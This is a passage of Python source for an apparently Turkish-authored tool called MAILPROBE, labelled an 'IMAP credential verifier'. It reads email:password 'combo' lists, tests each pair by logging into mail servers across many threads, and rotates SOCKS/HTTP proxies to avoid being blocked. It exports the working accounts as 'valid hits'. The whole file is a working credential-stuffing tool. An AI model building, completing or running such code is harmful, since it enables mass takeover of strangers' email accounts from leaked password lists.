        return ("BLOCKED", msg[:120])
    if any(t in low for t in AUTH_FAIL_RE):
        return ("INVALID", msg[:120])
    if any(t in low for t in NET_FAIL_RE):
        return ("ERROR", msg[:120])
    if isinstance(err, ssl.SSLError):
        return ("ERROR", msg[:120])
    if isinstance(err, (socket.timeout, TimeoutError)):
        return ("ERROR", "timeout")
    if isinstance(err, socket.gaierror):
        return ("ERROR", "dns")
    return ("INVALID", msg[:120] or "unknown")


# ═══════════════════════════════════════════════════════════════
#  PROXY-AWARE CONNECTION
# ═══════════════════════════════════════════════════════════════

def _open_socket(host: str, port: int, timeout: float,
                 proxy: Optional[str] = None,
                 ptype: str = "socks5") -> socket.socket:
    """
    Proxy varsa SOCKS/HTTP üzerinden, yoksa direkt socket açar.
    Proxy yoksa veya PySocks kurulu değilse direkt bağlanır.
    """
    if not proxy:
        sock = socket.create_connection((host, port), timeout=timeout)
        return sock

    # proxy string: host:port  veya  user:pass@host:port
    try:
        import socks as _socks   # PySocks
    except ImportError:
        # PySocks yok → sessizce direkt bağlan
        return socket.create_connection((host, port), timeout=timeout)

    user = pw = None
    addr = proxy
    if "@" in proxy:
        creds, addr = proxy.rsplit("@", 1)
        if ":" in creds:
            user, pw = creds.split(":", 1)

    if ":" not in addr:
        return socket.create_connection((host, port), timeout=timeout)
    phost, pport = addr.rsplit(":", 1)
    try:
        pport_i = int(pport)
    except ValueError:
        return socket.create_connection((host, port), timeout=timeout)

    t = ptype.lower()
    if t == "socks4":
        stype = _socks.SOCKS4
    elif t == "http":
        stype = _socks.HTTP
    else:
        stype = _socks.SOCKS5

    s = _socks.socksocket()
    s.set_proxy(stype, phost, pport_i, username=user, password=pw)
    s.settimeout(timeout)
    s.connect((host, port))
    return s


def _imap_via_socket(host: str, port: int, sock: socket.socket,
                     use_ssl: bool, timeout: float) -> imaplib.IMAP4:
    """
    Açılmış socket üzerinden imaplib.IMAP4 instance üret.
    SSL ise socket'i ssl ile sarar.
    """
    if use_ssl:
        wrapped = _SSL_CTX.wrap_socket(sock, server_hostname=host)
        conn = imaplib.IMAP4(host, port, timeout=timeout)
        # imaplib'in internal state'ini manuel kur
        conn.sock = wrapped
        conn.file = wrapped.makefile("rb")
        # greeting oku
        conn._connect()  # type: ignore[attr-defined]
        return conn
    else:
        conn = imaplib.IMAP4(host, port, timeout=timeout)
        conn.sock = sock
        conn.file = sock.makefile("rb")
        conn._connect()  # type: ignore[attr-defined]
        return conn


# ═══════════════════════════════════════════════════════════════
#  SINGLE ATTEMPT
# ═══════════════════════════════════════════════════════════════

def _attempt(
    email: str,
    password: str,
    host: str,
    port: int,
    mode: str,
    timeout: float = TIMEOUT,
) -> dict:
    started = time.time()
    conn: Optional[imaplib.IMAP4] = None
    proxy = _proxy_mgr.get() if _proxy_mgr else None

    try:
        if proxy:
            # Proxy üzerinden bağlan
            use_ssl = (mode == "ssl")
            sock = _open_socket(host, port, timeout, proxy,
                                _proxy_mgr.ptype if _proxy_mgr else "socks5")
            conn = _imap_via_socket(host, port, sock, use_ssl, timeout)
            if mode == "starttls":
                conn.starttls(ssl_context=_SSL_CTX)
        else:
            # Direkt bağlantı
            if mode == "ssl":
                conn = imaplib.IMAP4_SSL(host, port,
                                         ssl_context=_SSL_CTX, timeout=timeout)
            else:
                conn = imaplib.IMAP4(host, port, timeout=timeout)
                if mode == "starttls":
                    conn.starttls(ssl_context=_SSL_CTX)

        try:
            conn.login(email, password)
        except imaplib.IMAP4.error as auth_err:
            bucket, msg = classify_error(auth_err)
            return {
                "email": email, "password": password, "host": host,
                "port": port, "mode": mode, "status": bucket,
                "info": msg, "elapsed": time.time() - started,
                "proxy": proxy or "",
            }

        try:
            conn.logout()
        except Exception:
            try:
                conn.shutdown()
            except Exception:
                pass

        return {
            "email": email, "password": password, "host": host,
            "port": port, "mode": mode, "status": "VALID",
            "info": "authenticated", "elapsed": time.time() - started,
            "proxy": proxy or "",
        }

    except (socket.timeout, TimeoutError):
        return {
            "email": email, "password": password, "host": host, "port": port,
            "mode": mode, "status": "ERROR", "info": "timeout",
            "elapsed": time.time() - started, "proxy": proxy or "",
        }
    except socket.gaierror:
        return {
            "email": email, "password": password, "host": host, "port": port,
            "mode": mode, "status": "ERROR", "info": "dns",
            "elapsed": time.time() - started, "proxy": proxy or "",
        }
    except ssl.SSLError as e:
        return {
            "email": email, "password": password, "host": host, "port": port,
            "mode": mode, "status": "ERROR", "info": str(e)[:80],
            "elapsed": time.time() - started, "proxy": proxy or "",
        }
    except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError,
            BrokenPipeError, OSError) as e:
        return {
            "email": email, "password": password, "host": host, "port": port,
            "mode": mode, "status": "ERROR", "info": str(e)[:80],
            "elapsed": time.time() - started, "proxy": proxy or "",
        }
    except imaplib.IMAP4.error as e:
        bucket, msg = classify_error(e)
        return {
            "email": email, "password": password, "host": host, "port": port,
            "mode": mode, "status": bucket, "info": msg,
            "elapsed": time.time() - started, "proxy": proxy or "",
        }
    except Exception as e:
        bucket, msg = classify_error(e)
        return {
            "email": email, "password": password, "host": host, "port": port,
            "mode": mode, "status": bucket, "info": msg,
            "elapsed": time.time() - started, "proxy": proxy or "",
        }
    finally:
        if conn is not None:
            try:
                conn.shutdown()
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
#  CHECK COMBO (with fallback)
# ═══════════════════════════════════════════════════════════════

def check_combo(email: str, password: str) -> dict:
    candidates = resolve_provider(email)
    last: Optional[dict] = None
    for idx, (host, port, mode) in enumerate(candidates):
        result = _attempt(email, password, host, port, mode)
        if result["status"] in ("VALID", "INVALID"):
            return result
        if result["status"] == "BLOCKED":
            return result
        last = result
        if idx + 1 >= MAX_FALLBACK:
            break
    return last or {
        "email": email, "password": password, "host": "", "port": 0,
        "mode": "", "status": "ERROR", "info": "no candidate host",
        "elapsed": 0.0, "proxy": "",
    }


# ═══════════════════════════════════════════════════════════════
#  COMBO LOADER
# ═══════════════════════════════════════════════════════════════

def _parse_line(line: str) -> Optional[tuple[str, str]]:
    """Combo satırını parse et. En erken görünen separator kullanılır."""
    s = line.strip()
    if not s or s.startswith("#"):
        return None

    cands = [(s.find(sep), sep) for sep in (":", "|", ";", "\t", ",")]
    cands = [(p, sep) for p, sep in cands if p > 0]
    if not cands:
        return None
    _, sep = min(cands)
    email, _, password = s.partition(sep)
    email, password = email.strip(), password.strip()
    if email and password and "@" in email:
        return (email, password)
    return None


def load_combos(path: str | Path) -> list[tuple[str, str]]:
    p = Path(path)
    if not p.exists() or not p.is_file():
        raise FileNotFoundError(f"not a file: {path}")

    seen: set[tuple[str, str]] = set()
    out: list[tuple[str, str]] = []

    with p.open("r", encoding="utf-8", errors="ignore", newline="") as fh:
        for raw in fh:
            parsed = _parse_line(raw)
            if parsed is None:
                continue
            email, password = parsed
            key = (email.lower(), password)
            if key in seen:
                continue
            seen.add(key)
            out.append((email, password))
    return out


def load_stats(combos: list[tuple[str, str]]) -> dict:
    total = len(combos)
    known = sum(1 for e, _ in combos if is_known(e))
    domains = {e.rsplit("@", 1)[-1].lower() for e, _ in combos}
    return {
        "total": total,
        "known": known,
        "unknown": total - known,
        "domains": len(domains),
    }


# ═══════════════════════════════════════════════════════════════
#  RESULT STORE
# ═══════════════════════════════════════════════════════════════

class ResultStore:
    def __init__(self, total: int) -> None:
        self._lock = threading.Lock()
        self.total = total
        self.done = 0
        self.valid = 0
        self.invalid = 0
        self.error = 0
        self.blocked = 0
        self.results: list[dict] = []
        self.valid_hits: list[dict] = []
        self.recent: deque[dict] = deque(maxlen=RECENT_LOG)
        self.recent_valid: deque[dict] = deque(maxlen=RECENT_VALID)
        self.started_at = time.time()
        self._last_tick = self.started_at
        self._window: deque[tuple[float, int]] = deque(maxlen=30)

    def add(self, result: dict) -> None:
        with self._lock:
            self.done += 1
            status = result.get("status", "ERROR")
            if status == "VALID":
                self.valid += 1
                self.valid_hits.append(result)
                self.recent_valid.appendleft(result)
            elif status == "INVALID":
                self.invalid += 1
            elif status == "BLOCKED":
                self.blocked += 1
            else:
                self.error += 1

            self.results.append(result)
            self.recent.appendleft(result)

            now = time.time()
            self._window.append((now, self.done))
            if now - self._last_tick >= 0.5:
                self._last_tick = now

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "total": self.total, "done": self.done,
                "valid": self.valid, "invalid": self.invalid,
                "error": self.error, "blocked": self.blocked,
                "results": list(self.results),
                "valid_hits": list(self.valid_hits),
                "recent": list(self.recent),
                "recent_valid": list(self.recent_valid),
                "started_at": self.started_at,
            }

    def rate(self) -> float:
        with self._lock:
            if len(self._window) < 2:
                return 0.0
            t0, n0 = self._window[0]
            t1, n1 = self._window[-1]
            if t1 - t0 <= 0:
                return 0.0
            return (n1 - n0) / (t1 - t0)

    def eta_seconds(self) -> Optional[float]:
        rate = self.rate()
        if rate <= 0:
            return None
        with self._lock:
            remaining = self.total - self.done
        return remaining / rate

    def elapsed(self) -> float:
        return time.time() - self.started_at


# ═══════════════════════════════════════════════════════════════
#  EXPORT HELPERS
# ═══════════════════════════════════════════════════════════════

def _stamp() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def _ensure_outdir() -> Path:
    d = Path(OUTPUT_DIR)
    d.mkdir(parents=True, exist_ok=True)
    return d


def save_valid_hits(results: list[dict], prefix: str = "valid") -> Optional[Path]:
    if not results:
        return None
    d = _ensure_outdir()
    path = d / f"{prefix}_{_stamp()}.txt"
    with path.open("w", encoding="utf-8") as fh:
        for r in results:
            fh.write(f"{r['email']}:{r['password']}\n")
    try:
        os.chmod(path, 0o600)
    except Exception:
        pass
    return path


def save_csv(results: list[dict], prefix: str = "results") -> Optional[Path]:
    if not results:
        return None
    d = _ensure_outdir()
    path = d / f"{prefix}_{_stamp()}.csv"
    fields = ["email", "password", "status", "host", "port", "mode",
              "elapsed", "info", "proxy"]
    with path.open("w", encoding="utf-8", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=fields, extrasaction="ignore")
        w.writeheader()
        for r in results:
            w.writerow(r)
    return path


def save_json(results: list[dict], prefix: str = "results") -> Optional[Path]:
    if not results:
        return None
    import json
    d = _ensure_outdir()
    path = d / f"{prefix}_{_stamp()}.json"
    with path.open("w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2, default=str)
    return path


# ═══════════════════════════════════════════════════════════════
#  UI HELPERS
# ═══════════════════════════════════════════════════════════════

_SPINNER_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
_SPIN_IDX = 0


def _spin() -> str:
    global _SPIN_IDX
    _SPIN_IDX = (_SPIN_IDX + 1) % len(_SPINNER_FRAMES)
    return _SPINNER_FRAMES[_SPIN_IDX]


def _fmt_num(n: float) -> str:
    if n >= 1_000_000:
        return f"{n/1_000_000:.1f}M"
    if n >= 1_000:
        return f"{n/1_000:.1f}K"
    return str(int(n))


def _fmt_time(sec: float) -> str:
    if sec < 0 or sec != sec:
        return "--:--"
    sec = int(sec)
    m, s = divmod(sec, 60)
    h, m = divmod(m, 60)
    if h:
        return f"{h:02d}:{m:02d}:{s:02d}"
    return f"{m:02d}:{s:02d}"


def _short(s: str, n: int) -> str:
    s = "" if s is None else str(s)
    return s if len(s) <= n else s[: n - 1] + "…"


def _status_style(status: str) -> tuple[str, str]:
    return {
        "VALID":   ("✔", "success"),
        "INVALID": ("✘", "danger"),
        "ERROR":   ("⚠", "warning"),
        "BLOCKED": ("⛔", "accent"),
    }.get(status, ("·", "dim"))


# ═══════════════════════════════════════════════════════════════
#  BANNER / SETUP / STATS / PROGRESS / LOG / VALID / FOOTER
# ═══════════════════════════════════════════════════════════════

def banner_render() -> RenderableType:
    art = Text(BANNER, style="banner")
    meta = Text.assemble(
        ("IMAP CREDENTIAL VERIFIER", "title"),
        ("   ·   ", "muted"),
        (f"v{VERSION}", "primary"),
        ("   ·   ", "muted"),
        ("Credits ", "dim"),
        ("@Bouliizz", "credit"),
    )
    proxy_info = "off"
    if _proxy_mgr and _proxy_mgr:
        proxy_info = f"{len(_proxy_mgr)} ({_proxy_mgr.ptype})"
    sub = Text.assemble(
        (f"{provider_count():,}", "primary"),
        (" providers", "dim"),
        ("   ·   ", "muted"),
        (f"{WORKERS}", "primary"),
        (" workers", "dim"),
        ("   ·   ", "muted"),
        (f"{TIMEOUT}s", "primary"),
        (" timeout", "dim"),
        ("   ·   ", "muted"),
        ("proxy ", "dim"),
        (proxy_info, "success" if _proxy_mgr and _proxy_mgr else "warning"),
    )
    return Panel(
        Group(Align.center(art), Align.center(meta), Align.center(sub)),
        box=DOUBLE, border_style="border", padding=(1, 2),
    )


def setup_render(stats: dict, source: str) -> RenderableType:
    grid = Table.grid(padding=(0, 2), expand=True)
    grid.add_column(justify="left", ratio=1, no_wrap=True)
    grid.add_column(justify="right", ratio=1, no_wrap=True)
    grid.add_row(
        Text.assemble(("SOURCE  ", "dim"), (escape(source), "info")),
        Text.assemble((f"{stats['total']:,}", "primary"), (" combos", "dim")),
    )
    grid.add_row(
        Text.assemble(("KNOWN   ", "dim"),
                      (f"{stats['known']:,}", "success"),
                      (" on registry", "dim")),
        Text.assemble((f"{stats['unknown']:,}", "warning"),
                      (" fallback", "dim")),
    )
    grid.add_row(
        Text.assemble(("DOMAINS ", "dim"),
                      (f"{stats['domains']:,}", "primary"),
                      (" unique", "dim")),
        Text.assemble((f"{provider_count():,}", "accent"),
                      (" providers in registry", "dim")),
    )
    proxy_line = "off"
    if _proxy_mgr and _proxy_mgr:
        proxy_line = f"{len(_proxy_mgr)} proxies ({_proxy_mgr.ptype})"
    grid.add_row(
        Text.assemble(("PROXY   ", "dim"),
                      (proxy_line, "success" if _proxy_mgr and _proxy_mgr else "warning")),
        Text.assemble(("", "dim")),
    )
    return Panel(
        grid,
        title="[title]⌁ LOADED[/]",
        subtitle="[dim]run with ENTER[/]",
        border_style="border",
        box=ROUNDED,
        padding=(0, 2),
    )


def stats_render(snap: dict, rate: float, elapsed: float,
                 eta: Optional[float]) -> RenderableType:
    cells = [
        ("TOTAL",   f"{_fmt_num(snap['total'])}", "primary"),
        ("CHECKED", f"{_fmt_num(snap['done'])}", "info"),
        ("VALID",   f"{snap['valid']:,}", "success"),
        ("INVALID", f"{snap['invalid']:,}", "danger"),
        ("ERROR",   f"{snap['error']:,}", "warning"),
        ("BLOCKED", f"{snap['blocked']:,}", "accent"),
        ("RATE",    f"{rate:5.1f}/s", "primary"),
        ("ELAPSED", _fmt_time(elapsed), "info"),
        ("ETA",     _fmt_time(eta) if eta else "--:--", "dim"),
    ]
    grid = Table.grid(expand=True)
    for _ in cells:
        grid.add_column(justify="center", ratio=1)
    head = [Text(label, style="dim") for label, _, _ in cells]
    vals = [Text(value, style=style) for _, value, style in cells]
    grid.add_row(*head)
    grid.add_row(*vals)
    return Panel(grid, box=SIMPLE_HEAD, border_style="border", padding=(0, 1))


def progress_render(snap: dict, rate: float) -> RenderableType:
    done, total = snap["done"], max(1, snap["total"])
    pct = done / total
    width = 44
    filled = max(0, min(width, int(round(width * pct))))
    bar = Text()
    bar.append("▰" * filled, style="primary")
    bar.append("▱" * (width - filled), style="muted")
    bar.append(f"  {pct*100:6.2f}%", style="title")
    bar.append("   ", style="dim")
    bar.append(f"{_fmt_num(done)}/{_fmt_num(snap['total'])}", style="info")
    if rate > 0:
        bar.append("   ·   ", style="muted")
        bar.append(f"{rate:5.1f}/s", style="primary")
    bar.append(f"   {_spin()}", style="accent")
    return Panel(bar, box=MINIMAL, border_style="border", padding=(0, 1))


def log_render(recent: list[dict]) -> RenderableType:
    t = Table(box=SIMPLE_HEAD, expand=True, show_header=True,
              header_style="title", padding=(0, 1), show_edge=False)
    t.add_column("·",     width=2, justify="center", no_wrap=True)
    t.add_column("TIME",  width=8, justify="right", style="dim", no_wrap=True)
    t.add_column("EMAIL", ratio=3, overflow="ellipsis", no_wrap=True)
    t.add_column("PW",    ratio=2, overflow="ellipsis", no_wrap=True, style="dim")
    t.add_column("STAT",  width=9, justify="center", no_wrap=True)
    t.add_column("ms",    width=6, justify="right", style="dim", no_wrap=True)
    t.add_column("HOST",  ratio=2, overflow="ellipsis", no_wrap=True, style="muted")
    t.add_column("INFO",  ratio=3, overflow="ellipsis", no_wrap=True, style="dim")

    if not recent:
        t.add_row("", "", "[dim]awaiting first result…[/]", "", "", "", "", "")
    else:
        for r in recent:
            icon, style = _status_style(r.get("status", "ERROR"))
            stamp = r.get("ts") or datetime.now().strftime("%H:%M:%S")
            t.add_row(
                Text(icon, style=style),
                stamp,
                Text(r.get("email", ""), style="info"),
                _short(r.get("password", ""), 24),
                Text(r.get("status", ""), style=style),
                f"{r.get('elapsed', 0.0)*1000:.0f}",
                _short(r.get("host", ""), 32),
                _short(r.get("info", ""), 36),
            )
    return Panel(t, title="[title]⟡ LIVE LOG[/]",
                 border_style="border", box=ROUNDED, padding=(0, 1))


def valid_render(recent_valid: list[dict], count: int) -> RenderableType:
    t = Table(box=SIMPLE, expand=True, show_header=True,
              header_style="title", padding=(0, 1), show_edge=False)
    t.add_column("EMAIL", ratio=3, overflow="ellipsis", no_wrap=True, style="success")
    t.add_column("PW",    ratio=2, overflow="ellipsis", no_wrap=True, style="info")
    t.add_column("HOST",  ratio=2, overflow="ellipsis", no_wrap=True, style="muted")
    t.add_column("ms",    width=6, justify="right", style="dim")
    if not recent_valid:
        t.add_row("[dim]—[/]", "[dim]no hits yet[/]", "", "")
    else:
        for r in recent_valid[:12]:
            t.add_row(
                r.get("email", ""),
                _short(r.get("password", ""), 26),
                _short(r.get("host", ""), 28),
                f"{r.get('elapsed', 0.0)*1000:.0f}",
            )
    return Panel(t,
                 title=f"[success]✦ VALID HITS  [dim]({count:,})[/]",
                 border_style="success", box=ROUNDED, padding=(0, 1))


def footer_render(running: bool, output_hint: str = "") -> RenderableType:
    left = Text.assemble(
        ("CTRL+C ", "primary"), ("stop", "dim"),
        ("   ·   ", "muted"),
        ("CTRL+Q ", "primary"), ("quit", "dim"),
    )
    mid = Text.assemble(
        ("STATE ", "dim"),
        (("RUNNING" if running else "IDLE"),
         "primary" if running else "dim"),
    )
    right = Text.assemble(
        (output_hint, "dim") if output_hint else ("", ""),
        ("   ·   ", "muted"),
        ("@Bouliizz", "credit"),
    )
    grid = Table.grid(expand=True)
    grid.add_column(justify="left", ratio=1)
    grid.add_column(justify="center", ratio=1)
    grid.add_column(justify="right", ratio=1)
    grid.add_row(left, mid, right)
    return grid


def dashboard_render(snap: dict, rate: float, eta: Optional[float],
                     running: bool, output_hint: str = "") -> RenderableType:
    elapsed = snap.get("elapsed", time.time() - snap["started_at"])
    top = Panel(
        Group(
            Align.center(Text(BANNER, style="banner")),
            Align.center(Text.assemble(
                ("MAILPROBE ", "title"),
                (f"v{VERSION}", "primary"),
                ("   ·   ", "muted"),
                ("Credits ", "dim"),
                ("@Bouliizz", "credit"),
            )),
        ),
        box=DOUBLE, border_style="border", padding=(0, 1),
    )
    body = Group(
        stats_render(snap, rate, elapsed, eta),
        progress_render(snap, rate),
    )
    log_panel = log_render(snap.get("recent", []))
    valid_panel = valid_render(snap.get("recent_valid", []), snap["valid"])
    return Group(top, body, log_panel, valid_panel,
                 footer_render(running, output_hint))


def print_banner() -> None:
    console.clear()
    console.print(banner_render())
    console.print()


def print_setup(stats: dict, source: str) -> None:
    console.print(setup_render(stats, source))
    console.print()


def print_error(msg: str) -> None:
    console.print(Panel(
        Text(msg, style="danger"),
        box=HEAVY_EDGE, border_style="danger", padding=(0, 2),
        title="[danger]✖ ERROR[/]",
    ))


# ═══════════════════════════════════════════════════════════════
#  FILE DIALOG PROMPT  ← YENİ
# ═══════════════════════════════════════════════════════════════

def print_prompt(path_hint: str = "") -> str:
    """
    1) tkinter file dialog dene (varsa)
    2) iptal/başarısız → manuel path input
    """
    # ── tkinter dialog ─────────────────────────────────────
    try:
        import tkinter as tk
        from tkinter import filedialog

        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        root.update()

        console.print(Panel(
            Text.assemble(
                ("◆ ", "primary"),
                ("Açılan pencereden combo dosyanı seç.", "dim"),
                ("\n", ""),
                ("  Format:  email:password  ", "muted"),
                ("(one per line)", "muted"),
            ),
            title="[title]⟢ INPUT[/]",
            border_style="border", box=ROUNDED, padding=(0, 2),
        ))

        path = filedialog.askopenfilename(
            title="Combo dosyası seç",
            filetypes=[
                ("Combo files", "*.txt *.csv *.lst *.combo"),
                ("All files", "*.*"),
            ],
        )
        root.destroy()

        if path:
            return path.strip()
        console.print("[muted]dialog iptal — manuel path soruluyor…[/]")
    except Exception as e:
        console.print(f"[muted]dialog açılamadı ({type(e).__name__}) — manuel path[/]")

    # ── fallback: manuel input ─────────────────────────────
    console.print(Panel(
        Text.assemble(
            ("◆ ", "primary"),
            ("Combo dosyasının tam yolunu yaz.", "dim"),
            ("\n", ""),
            ("  Format:  email:password  ", "muted"),
        ),
        title="[title]⟢ INPUT[/]",
        border_style="border", box=ROUNDED, padding=(0, 2),
    ))
    try:
        return console.input("\n  [primary]Enter Path[/] [muted]»[/] ").strip()
    except (KeyboardInterrupt, EOFError):
        console.print("\n[muted]cancelled.[/]")
        raise SystemExit(0)


# ═══════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════

def summary_render(snap: dict, elapsed: float, rate: float,
                   paths: list[tuple[str, Optional[Path]]]) -> RenderableType:
    totals = Table.grid(padding=(0, 2), expand=True)
    totals.add_column(justify="left", ratio=1)
    totals.add_column(justify="right", ratio=1)
    rows = [
        ("CHECKED",  f"{snap['done']:,}/{snap['total']:,}", "info"),
        ("VALID",    f"{snap['valid']:,}", "success"),
        ("INVALID",  f"{snap['invalid']:,}", "danger"),
        ("ERROR",    f"{snap['error']:,}", "warning"),
        ("BLOCKED",  f"{snap['blocked']:,}", "accent"),
        ("ELAPSED",  _fmt_time(elapsed), "primary"),
        ("RATE",     f"{rate:.1f}/s", "primary"),
    ]
    for i in range(0, len(rows), 2):
        pair = rows[i:i+2]
        left_label, left_val, left_style = pair[0]
        totals.add_row(
            Text.assemble((f"{left_label}  ", "dim"), (left_val, left_style)),
            Text.assemble((f"{pair[1][0]}  ", "dim"), (pair[1][1], pair[1][2]))
            if len(pair) > 1 else Text(""),
        )
    files = Table.grid(padding=(0, 1))
    files.add_column(justify="left", no_wrap=True, style="dim")
    files.add_column(justify="left", no_wrap=True, style="success")
    for label, p in paths:
        files.add_row(f"{label:<12}", str(p) if p else "[muted](skipped)[/]")
    return Panel(
        Group(
            Align.center(Text("FINAL SUMMARY", style="title")),
            Text(""),
            totals,
            Text(""),
            files,
        ),
        box=DOUBLE, border_style="border", padding=(1, 3),
    )


# ═══════════════════════════════════════════════════════════════
#  RUNNER
# ═══════════════════════════════════════════════════════════════

def run(combos: list[tuple[str, str]], source: str) -> tuple[dict, float]:
    total = len(combos)
    store = ResultStore(total)
    state = {"running": True}
    output_hint = f"out → {Path(OUTPUT_DIR).resolve()}"

    def render() -> RenderableType:
        snap = store.snapshot()
        return dashboard_render(
            snap, store.rate(), store.eta_seconds(),
            state["running"], output_hint,
        )

    interrupted = False
    futures: list = []

    with Live(render(), console=console, refresh_per_second=8,
              screen=False, vertical_overflow="visible") as live:
        live.update(render())
        try:
            with ThreadPoolExecutor(max_workers=WORKERS) as pool:
                futures = [pool.submit(check_combo, e, p) for e, p in combos]
                for fut in as_completed(futures):
                    try:
                        res = fut.result()
                    except Exception as exc:
                        res = {
                            "email": "?", "password": "?", "host": "",
                            "port": 0, "mode": "", "status": "ERROR",
                            "info": f"{type(exc).__name__}: {exc}"[:120],
                            "elapsed": 0.0, "proxy": "",
                        }
                    res["ts"] = datetime.now().strftime("%H:%M:%S")
                    store.add(res)
                    live.update(render())
        except KeyboardInterrupt:
            interrupted = True
            for fut in futures:
                fut.cancel()
            state["running"] = False
            live.update(render())
        finally:
            state["running"] = False
            live.update(render())

    if interrupted:
        console.print()
        console.print(Panel(
            Text("Interrupted — partial results will be saved.", style="warning"),
            box=HEAVY_EDGE, border_style="warning", padding=(0, 2),
        ))
    return store.snapshot(), store.rate()


# ═══════════════════════════════════════════════════════════════
#  EXPORT / SIGNALS / MAIN
# ═══════════════════════════════════════════════════════════════

def _export_all(snap: dict) -> list[tuple[str, Optional[Path]]]:
    out: list[tuple[str, Optional[Path]]] = []
    with console.status("[primary]writing exports…[/]", spinner="dots"):
        try:
            vp = save_valid_hits(snap["valid_hits"])
        except Exception:
            vp = None
        out.append(("valid hits", vp))
        try:
            cp = save_csv(snap["results"])
        except Exception:
            cp = None
        out.append(("csv", cp))
        try:
            jp = save_json(snap["results"])
        except Exception:
            jp = None
        out.append(("json", jp))
    return out


def _sigterm_handler(signum, frame):
    raise KeyboardInterrupt


def _install_signals() -> None:
    import signal
    for sig_name in ("SIGTERM", "SIGHUP"):
        sig = getattr(signal, sig_name, None)
        if sig is None:
            continue
        try:
            signal.signal(sig, _sigterm_handler)
        except (ValueError, OSError):
            pass


def _init_proxy() -> None:
    """Proxy dosyası varsa yükle, yoksa sessizce proxysiz devam et."""
    global _proxy_mgr
    if USE_PROXY is False:
        _proxy_mgr = None
        return
    proxies = load_proxies(PROXY_FILE)
    if proxies:
        _proxy_mgr = ProxyManager(proxies, PROXY_TYPE)
        console.print(Panel(
            Text.assemble(
                ("PROXY AKTİF  ", "success"),
                (f"{len(proxies)} proxies ({PROXY_TYPE})", "info"),
                ("\n", ""),
                (f"kaynak: {PROXY_FILE}", "dim"),
            ),
            box=ROUNDED, border_style="success", padding=(0, 2),
        ))
    else:
        _proxy_mgr = None


def main() -> None:
    # Proxy'yi ilk yükle (banner'da göstermek için)
    _init_proxy()
    print_banner()

    try:
        raw = print_prompt()
    except SystemExit:
        return

    if not raw:
        print_error("no path provided")
        return

    path = raw.strip().strip('"').strip("'")
    if path.startswith("file://"):
        try:
            from urllib.parse import unquote
            path = unquote(path[7:])
        except Exception:
            path = path[7:]
    path = os.path.expanduser(path)

    if not os.path.exists(path):
        print_error(f"file not found → {path}")
        return
    if not os.path.isfile(path):
        print_error(f"not a regular file → {path}")
        return

    with console.status("[primary]reading combos…[/]", spinner="dots"):
        try:
            combos = load_combos(path)
        except PermissionError:
            print_error(f"permission denied → {path}")
            return
        except UnicodeDecodeError:
            print_error(f"file is not text → {path}")
            return
        except Exception as exc:
            print_error(f"failed to load → {type(exc).__name__}: {exc}")
            return

    if not combos:
        print_error("no valid combos in file  (format: email:password)")
        return

    stats = load_stats(combos)
    print_banner()
    print_setup(stats, path)
    console.print()

    started = time.time()
    try:
        snap, rate = run(combos, path)
    except KeyboardInterrupt:
        console.print()
        console.print(Panel(
            Text("Aborted before completion.", style="warning"),
            box=HEAVY_EDGE, border_style="warning", padding=(0, 2),
        ))
        return
    except Exception as exc:
        print_error(f"engine error → {type(exc).__name__}: {exc}")
        return

    elapsed = time.time() - started
    paths = _export_all(snap)
    console.print()
    console.print(summary_render(snap, elapsed, rate, paths))
    console.print()
    console.print(Align.center(Text.assemble(
        ("— ", "muted"),
        ("MAILPROBE ", "primary"),
        (f"v{VERSION}", "primary"),
        ("   ·   ", "muted"),
        ("Credits ", "dim"),
        ("@Bouliizz", "credit"),
    )))
    console.print()


if __name__ == "__main__":
    _install_signals()
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[muted]bye.[/]")
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as exc:
        console.print()
        print_error(f"fatal → {type(exc).__name__}: {exc}")
        sys.exit(1)
    finally:
        try:
            console.show_cursor(True)
        except Exception:
            pass
